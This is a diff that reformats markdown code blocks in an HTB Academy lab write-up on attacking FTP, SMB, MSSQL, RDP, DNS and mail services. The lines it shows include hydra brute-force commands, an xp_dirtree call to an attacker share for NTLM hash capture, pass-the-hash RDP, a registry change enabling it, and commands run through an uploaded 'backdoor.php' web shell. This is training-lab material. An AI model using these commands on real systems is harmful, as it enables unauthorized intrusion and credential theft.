@@ -135,8 +135,8 @@ get passwords.list
 
 ```bash
 hydra -L users.list -P passwords.list ftp://<target-IP>:2121
-```
 -t 48
+```
 
 
 The bruteforce found the credentials 'robin:7iz4rnckjsduza7'
@@ -162,8 +162,8 @@ lets use the credentials obtained in the previous question to ssh login
 to the target machine:
 ```bash
 ssh robin@<target-IP>
-```
 then enter the password:
+```
 
 *
 *
@@ -203,7 +203,7 @@ crackmapexec smb <target-IP> --shares -u '' -p ''
 There is the share 'GGJ' which has read permissions for any user.
 
 Method 2: We can also use smbmap
-smbmap -H <target-IP>
+`smbmap -H <target-IP>`
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/attacking-common-services/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -271,8 +271,8 @@ Lets try to access the share again, this time with 'jason' credentials – we ca
 ```bash
 use 'smbclient' to download the file using 1 command:
 smbclient //10.129.130.196/GGJ -U jason -c 'get id_rsa
-```
 id_rsa'
+```
 and we enter the obtained password:
 
 
@@ -363,7 +363,9 @@ sudo responder -I tun0
 
 #### Technical Methodology & Exploit Execution:
 
+```sql
 xp_dirtree '\\<attacker-IP>\share\'
+```
 and while on the mssql CLI we wont get anything seems to be meaningful:
 
 
@@ -420,13 +422,17 @@ where -m 5600 is for NTLMv2 hash:
 
 lets attempt to login to the MSSQL service to 'mssqlsvc' user in the
 same way we did with 'htbdbuser':
+```bash
 mssqlclient.py -p 1433 mssqlsvc@<target-IP>
+```
 we enter the obtained 'princess1' password..
 
 We get 'Encryption required', and failed login.
 
 To solve it, we will add the '-windows-auth' flag to the login command:
+```bash
 mssqlclient.py -p 1433 mssqlsvc@<target-IP> -windows-auth
+```
 
 
 We are in.
@@ -479,9 +485,8 @@ select * from tb_flag;
 lets RDP login to the target machine with the provided credentials
 'htb-rdp:HTBRocks!' using the command:
 ```bash
-xfreerdp /v:<Target IP> /u:htb-rdp /p:HTBRocks! /dynamic-
+xfreerdp /v:<Target IP> /u:htb-rdp /p:HTBRocks! /dynamic-resolution
 ```
-resolution
 
 
 We immidiaetly can observe the file on the desktop – 'pentest-notes.txt'
@@ -523,8 +528,8 @@ administrator hash.
 To enable RDP we will change the 'DisableRestrictedAdmin' registry key, we will
 ```bash
 use the cmd command:
-```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t
+```
 REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 
 
@@ -533,8 +538,8 @@ Now we exit the 'htb-rdp' RDP session, and RDP login with the administrator
 hash, using the xfreerdp command:
 ```bash
 xfreerdp /v:<target-IP> /u:Administrator
-```
 /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution
+```
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/attacking-common-services/p017_01.jpg)
 *_Figure 17.1 — Lab execution and output verification (Page 17)_*
@@ -580,8 +585,8 @@ Before we proceed, we need find the nameserver of the domain, we will use
 the command:
 ```bash
 dig ns inlanefreight.htb @<target-IP>
-```
 a single answer – 'ns.inlanefreight.htb'. that's our nameserver:
+```
 
 ![Figure 19.1 — Lab execution and output verification (Page 19)](/assets/images/posts/htb-academy/attacking-common-services/p019_01.jpg)
 *_Figure 19.1 — Lab execution and output verification (Page 19)_*
@@ -598,7 +603,7 @@ Now, we need to link the nameserver to the target IP in '/etc/hosts':
 sudo nano /etc/hosts
 ```
 and in it:
-<target-IP> ns1.inlanefreight.htb
+`<target-IP>` ns1.inlanefreight.htb
 
 
 
@@ -644,9 +649,9 @@ dig axfr @<target-IP> hr.inlanefreight.htb
 we will get the 'users.list' from the resources bag to the pwnbox, and
 ```bash
 run smtp bruteforce using the command:
-```
 smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t
-<target-IP>
+`<target-IP>`
+```
 
 ![Figure 22.1 — Lab execution and output verification (Page 22)](/assets/images/posts/htb-academy/attacking-common-services/p022_01.jpg)
 *_Figure 22.1 — Lab execution and output verification (Page 22)_*
@@ -667,13 +672,13 @@ username combined with the domain (which together comprised the mail),
 and run pop3 brute force, using hydra on the resources bag 'pws.list':
 ```bash
 hydra -l marlin@inlanefreight.htb -P pws.list -f
-```
 pop3://<target-IP>
+```
 
 
 The credentials are 'marlin@inlanefreight.htb:poohbear'.
 Now, time to login to the pop3 email service and get the flag:
-telnet <target-IP> 110
+`telnet <target-IP> 110`
 
 
 Pop3 CLI is opened, lets login:
@@ -733,7 +738,7 @@ The machine is running smtp, lets use that to run username emumaration. We
 will download from the resources bag the 'users.list' file, and run the following
 enumeration command:
 smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t
-<target-IP>
+`<target-IP>`
 
 ![Figure 25.1 — Lab execution and output verification (Page 25)](/assets/images/posts/htb-academy/attacking-common-services/p025_01.jpg)
 *_Figure 25.1 — Lab execution and output verification (Page 25)_*
@@ -750,14 +755,14 @@ valid username. Lets get her password, we will bruteforce the smtp service
 with hydra, using rockyou.txt wordlist:
 ```bash
 hydra -l fiona@inlanefreight.htb -P rockyou.txt -f
+`smtp://<target-IP>`
 ```
-smtp://<target-IP>
 
 
 The credentials are: 'fiona:987654321'.
 Now that we know the credentials, lets open the https website, which we saw
 running on the nmap scan:
-https://<target-IP>
+`https://<target-IP>`
 
 
 And we will be required to enter credentials:
@@ -783,7 +788,7 @@ just accesses via the https, and can upload and download files, which are
 stored in the path of 'C:\CoreFTP'. And Apache service, running on http port 80
 (and 4443) – which its files are stored in 'C:\xampp\htdocs'.
 Lets take a look in the http website:
-http://<target-IP>
+`http://<target-IP>`
 
 ![Figure 27.1 — Lab execution and output verification (Page 27)](/assets/images/posts/htb-academy/attacking-common-services/p027_01.png)
 *_Figure 27.1 — Lab execution and output verification (Page 27)_*
@@ -800,7 +805,7 @@ http://<target-IP>
 
 #### Technical Methodology & Exploit Execution:
 
-mysql -h <target-IP> -P 3306 -u fiona -p
+`mysql -h <target-IP> -P 3306 -u fiona -p`
 
 
 We are in.
@@ -821,19 +826,19 @@ Naming it 'backdoor.php'
 
 The file is uploaded.
 Lets have a small test of running 'whoami':
-http://<target-IP>/backdoor.php?cmd=whoami
+`http://<target-IP>/backdoor.php?cmd=whoami`
 
 
 We are system.
 Now lets run 'dir':
-http://<target-IP>/backdoor.php?cmd=dir
+`http://<target-IP>/backdoor.php?cmd=dir`
 
 
 We can see the 'backdoor.php'here along with other files. We are also can see
 the present working directoy (in the first output line).
 After some trial and error about flag can be found in the Admininistrator's
 Desktop:
-http://<target-IP>/backdoor.php?cmd=dir
+`http://<target-IP>/backdoor.php?cmd=dir`
 C:\Users\Administrator\Desktop
 
 ![Figure 29.1 — Lab execution and output verification (Page 29)](/assets/images/posts/htb-academy/attacking-common-services/p029_01.jpg)
@@ -854,8 +859,7 @@ C:\Users\Administrator\Desktop
 
 #### Technical Methodology & Exploit Execution:
 
-http://<target-
-IP>/backdoor.php?cmd=type%20C:\Users\Administrator\Desktop\f
+`http://<target-IP>/backdoor.php?cmd=type%20C:\Users\Administrator\Desktop\f`
 lag.txt
 
 
@@ -919,7 +923,7 @@ nmap <target-IP> -p 30021 -sV -sC
 anonymous FTP login is enabled.
 
 Lets see what's inside:
-ftp <target-IP> 30021
+`ftp <target-IP> 30021`
 and 'ls' the server:
 
 There is a directory called 'simon'.
@@ -964,8 +968,8 @@ We found a password – the credentials are 'simon:8Ns8j1b!23hs4921smHzwn'
 Lets ssh login to the target machine using the obtained credentials:
 ```bash
 ssh simon@<target-IP>
-```
 then enter the password:
+```
 
 We are in. lets see what's is in the home's directoy, and take the flag in it:
 
@@ -1056,8 +1060,8 @@ mkdir imported_data
 
 ```bash
 sudo mount -t cifs //<target-IP>/"home" imported_data -o
-```
 username=simon,password=liverpool
+```
 
 
 The share's was sucsessfully mounuted to 'imported_data' directory.
@@ -1103,8 +1107,8 @@ bruteforce the RDP service appeared in the nmap results (port 3389), using the
 obtained creds file as password wordlist:
 ```bash
 hydra -l fiona -P imported_data/IT/Fiona/creds.txt
+`rdp://<target-IP>`
 ```
-rdp://<target-IP>
 
 
 The credentials are 'fiona:48Ns72!bns74@S84NNNSl'
@@ -1124,7 +1128,7 @@ The credentials are 'fiona:48Ns72!bns74@S84NNNSl'
 #### Technical Methodology & Exploit Execution:
 
 lets MSSQL login to fiona's user with the obtained credentials:
-mssqlclient.py -p 1433 fiona@<target-IP> -windows-auth
+`mssqlclient.py -p 1433 fiona@<target-IP> -windows-auth`
 
 
 We are in. in the mssql CLI, we run the the impersonate check command on
